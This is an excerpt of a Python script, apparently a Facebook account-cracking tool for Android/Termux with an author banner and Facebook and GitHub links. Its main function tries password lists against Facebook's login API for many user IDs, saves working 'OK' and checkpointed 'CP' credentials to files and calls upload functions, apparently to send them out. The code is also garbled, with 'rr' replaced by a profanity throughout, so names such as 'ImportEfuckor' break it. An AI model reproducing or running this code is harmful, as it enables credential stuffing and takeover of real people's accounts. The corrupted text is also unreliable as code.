...
try:
	import requests
except ImportEfuckor:
	os.system("pip install requests")

try:
	import concufuckent.futures
except ImportEfuckor:
...
import base64
import subprocess
from concufuckent.futures import ThreadPoolExecutor
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://www.facebook.com/kn.je.id.er.link.copy.kortaco/test/blob/main/a.txt"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/kn.je.id.er.link.copy.kortaco")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰fuck-RIYAD")
	subprocess.check_output(["am", "start", "https://www.facebook.com/kn.je.id.er.link.copy.kortaco"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/desirecoder/text/main/Dis').text
			if basesplit in plr:
				key = basesplit
		...
		except requests.exceptions.ConnectionEfuckor:
...
..:::::..::..:::::..:::::::::::..:::::..::........::::.......:::........::.......:::......:::'                                 
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : Olidur Rahman 
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : Fb grup nai
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : desirecoder
...
\033[1;90m══════════════════════════════════════════════════
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: Siyam): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [fuck_OLD] : %s/%s -> \033[0;92m [ fuck-OK:%s ]- \033[0;91m[fuck-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&efuckor_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&cufuckently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[fuck-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [fuck-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["efuckor_msg"]:
				print("\r \033[0;91m[fuck-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [fuck-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
